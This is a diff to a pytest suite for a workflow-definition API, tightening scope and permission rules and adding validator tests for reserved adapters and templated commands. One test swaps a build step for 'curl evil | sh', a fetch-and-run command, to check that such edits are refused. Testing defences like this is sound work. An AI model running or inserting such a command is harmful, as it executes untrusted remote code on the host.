@@ -202,6 +202,8 @@ def test_create_matrix(world, role, kind):
         payload = {"scope_kind": scope_kind, "scope_id": scope_id, "note": "new"}
         payload.update({"name": f"fresh-{where}", "body": GOOD} if kind is defs.WORKFLOW
                        else {"key": f"fresh-{where}", "kind": "role", "body": ROLE_DOC})
+        if kind is defs.WORKFLOW and outcome is True and scope_kind != "project":
+            outcome = 400
         _expect(client.post(path, json=payload), outcome, 201)
 
 
@@ -337,7 +339,7 @@ def test_step_up_needed_except_for_body_edits(world):
 
 def test_non_admin_cannot_add_or_change_raw_commands(world):
     client = _client(world, "team_lead")
-    create = client.post("/api/workflows", json={"name": "raw", "scope_kind": "team", "scope_id": world.own.team,
+    create = client.post("/api/workflows", json={"name": "raw", "scope_kind": "project", "scope_id": world.own.project,
                                                  "body": RAW})
     assert create.status_code == 422
     errors = create.json()["validation"]["errors"]
@@ -355,11 +357,12 @@ def test_non_admin_cannot_add_or_change_raw_commands(world):
 def test_editing_other_parts_of_an_imported_workflow_is_allowed(world):
     admin = _client(world, "admin")
     imported = admin.post(f"/api/workflows/{world.instance_wf}/fork",
-                          json={"scope_kind": "team", "scope_id": world.own.team, "name": "imported"})
+                          json={"scope_kind": "project", "scope_id": world.own.project, "name": "imported"})
     assert imported.status_code == 201, imported.text
     object_id = imported.json()["workflow"]["id"]
     lead = _client(world, "team_lead")
-    edited = RAW.replace("number: 3", "number: 9").replace("  - id: post", "  - id: post\n    fail_as_value: true")
+    edited = RAW.replace("name: review", "name: imported").replace("number: 3", "number: 9").replace(
+        "  - id: post", "  - id: post\n    fail_as_value: true")
     assert lead.post(f"/api/workflows/{object_id}", json={"body": edited, "base_version": 1}).status_code == 200
     changed = edited.replace("./scripts/build.sh", "curl evil | sh")
     refused = lead.post(f"/api/workflows/{object_id}", json={"body": changed, "base_version": 2})
@@ -383,6 +386,17 @@ def test_runtime_adapter_fields_are_refused_for_everyone(world):
     body = RAW.replace("    cmd: ./scripts/build.sh\n", "    cmd: ./scripts/build.sh\n    pack_dir: /tmp\n")
     result = admin.post("/api/workflows/validate", json={"body": body}).json()["validation"]
     assert "RUNTIME_FIELD" in {e["code"] for e in result["errors"]}
+
+
+def test_an_adapter_cannot_stand_in_for_a_builtin_tool(world):
+    admin = _client(world, "admin")
+    named = RAW.replace("  build:\n    name: build\n", "  github/post-review:\n    name: github/post-review\n")
+    command = RAW.replace("cmd: ./scripts/build.sh", "cmd: armature  tool slack.post")
+    for body in (named, command):
+        result = admin.post("/api/workflows/validate", json={"body": body}).json()["validation"]
+        assert "RESERVED_ADAPTER" in {e["code"] for e in result["errors"]}
+    plain = admin.post("/api/workflows/validate", json={"body": RAW}).json()["validation"]
+    assert "RESERVED_ADAPTER" not in {e["code"] for e in plain["errors"]}
 
 
 def test_validation_reports_lines(world):
@@ -487,8 +501,11 @@ def test_delete_keeps_runs_and_refuses_active_jobs(world):
 def test_fork_names_must_be_free_in_the_destination(world):
     admin = _client(world, "admin")
     clash = admin.post(f"/api/workflows/{world.instance_wf}/fork",
-                       json={"scope_kind": "team", "scope_id": world.own.team})
+                       json={"scope_kind": "project", "scope_id": world.own.project})
     assert clash.status_code == 409
+    team = admin.post(f"/api/workflows/{world.instance_wf}/fork",
+                      json={"scope_kind": "team", "scope_id": world.own.team, "name": "elsewhere"})
+    assert team.status_code == 400 and "project" in team.json()["error"]
 
 
 def test_resolution_prefers_project_then_team_then_instance(world):
@@ -691,7 +708,7 @@ FROZEN = {
 @pytest.fixture
 def full(world):
     created = _client(world, "admin").post("/api/workflows", json={
-        "name": "full", "scope_kind": "team", "scope_id": world.own.team, "body": FULL})
+        "name": "full", "scope_kind": "project", "scope_id": world.own.project, "body": FULL})
     assert created.status_code == 201, created.text
     return created.json()["workflow"]["id"]
 
@@ -726,20 +743,17 @@ def test_allowlisted_changes_save_for_a_lead(world, full):
     assert gone.status_code == 422 and gone.json()["validation"]["errors"][0]["path"] == "stages[think]"
 
 
-def test_templated_commands_need_an_admin(world):
+@pytest.mark.parametrize("role", ["team_lead", "admin"])
+def test_templated_commands_are_refused_for_everyone(world, role):
     body = RAW.replace("cmd: ./scripts/build.sh", "cmd: ./scripts/build.sh {{ number }}")
     with world.engine.begin() as conn:
         templated = _add_def(conn, defs.WORKFLOW, defs.INSTANCE, "templated", body, world.clock)
-    lead = _client(world, "team_lead")
-    forked = lead.post(f"/api/workflows/{templated}/fork", json={"scope_kind": "team", "scope_id": world.own.team})
+    forked = _client(world, role).post(f"/api/workflows/{templated}/fork",
+                                       json={"scope_kind": "project", "scope_id": world.own.project})
     assert forked.status_code == 422
-    assert "TEMPLATED_COMMAND" in {e["code"] for e in forked.json()["validation"]["errors"]}
-    admin = _client(world, "admin")
-    copy = admin.post(f"/api/workflows/{templated}/fork", json={"scope_kind": "team", "scope_id": world.own.team})
-    assert copy.status_code == 201, copy.text
-    edited = body.replace("number: 3", "number: 4")
-    saved = lead.post(f"/api/workflows/{copy.json()['workflow']['id']}", json={"body": edited, "base_version": 1})
-    assert saved.status_code == 422
+    errors = [e for e in forked.json()["validation"]["errors"] if e["code"] == "ADAPTER_CMD_INPUT"]
+    assert errors and "read it from ARMATURE_WITH or ARMATURE_CONTEXT" in errors[0]["message"]
+    assert errors[0]["path"] == "adapters.build.cmd"
 
 
 def _errors(world, body, role="admin"):
@@ -776,7 +790,7 @@ def test_anchors_aliases_and_huge_documents_are_refused_quickly(world):
         "stages:\n  - id: s\n    adapter: demo/post\n"
     started = time.monotonic()
     lead = _client(world, "team_lead")
-    created = lead.post("/api/workflows", json={"name": "bomb", "scope_kind": "team", "scope_id": world.own.team,
+    created = lead.post("/api/workflows", json={"name": "bomb", "scope_kind": "project", "scope_id": world.own.project,
                                                 "body": bomb})
     assert created.status_code == 422 and time.monotonic() - started < 5
     assert created.json()["validation"]["errors"][0]["code"] == "YAML"
@@ -941,7 +955,7 @@ def test_a_lead_edits_only_the_aliases_of_an_instance_scoped_provider(world):
 
 def test_create_takes_a_workflow_kind_and_defaults_to_other(world):
     admin = _client(world, "admin")
-    base = {"scope_kind": "team", "scope_id": world.own.team, "body": GOOD}
+    base = {"scope_kind": "project", "scope_id": world.own.project, "body": GOOD}
     made = admin.post("/api/workflows", json={**base, "name": "fixer", "kind": "fix"})
     assert made.status_code == 201, made.text
     assert made.json()["workflow"]["kind"] == "fix"
@@ -999,7 +1013,7 @@ def test_fork_copies_the_workflow_kind(world):
     admin = _client(world, "admin")
     assert admin.post(f"/api/workflows/{world.instance_wf}/kind", json={"kind": "port"}).status_code == 200
     forked = admin.post(f"/api/workflows/{world.instance_wf}/fork",
-                        json={"scope_kind": "team", "scope_id": world.other.team, "name": "ported"})
+                        json={"scope_kind": "project", "scope_id": world.other.project, "name": "ported"})
     assert forked.status_code == 201, forked.text
     assert forked.json()["workflow"]["kind"] == "port"
 
@@ -1102,15 +1116,15 @@ def test_create_links_earlier_runs_of_its_name_in_its_scope(world):
         project = _named_run(conn, world, world.own.team, world.own.project, "nightly")
         other = _named_run(conn, world, world.other.team, None, "nightly")
     lead = _client(world, "team_lead")
-    made = lead.post("/api/workflows", json={"scope_kind": "team", "scope_id": world.own.team, "name": "nightly",
+    made = lead.post("/api/workflows", json={"scope_kind": "project", "scope_id": world.own.project, "name": "nightly",
                                              "body": GOOD})
     assert made.status_code == 201, made.text
     workflow_id = made.json()["workflow"]["id"]
     links = _links(world)
-    assert links[team] == links[project] == workflow_id and links[other] is None
+    assert links[project] == workflow_id and links[team] is None and links[other] is None
     [detail] = _relink_audits(world)
-    assert detail["runs"] == 2
-    assert lead.post("/api/workflows", json={"scope_kind": "team", "scope_id": world.own.team, "name": "quiet",
+    assert detail["runs"] == 1
+    assert lead.post("/api/workflows", json={"scope_kind": "project", "scope_id": world.own.project, "name": "quiet",
                                              "body": GOOD}).status_code == 201
     assert len(_relink_audits(world)) == 1
 
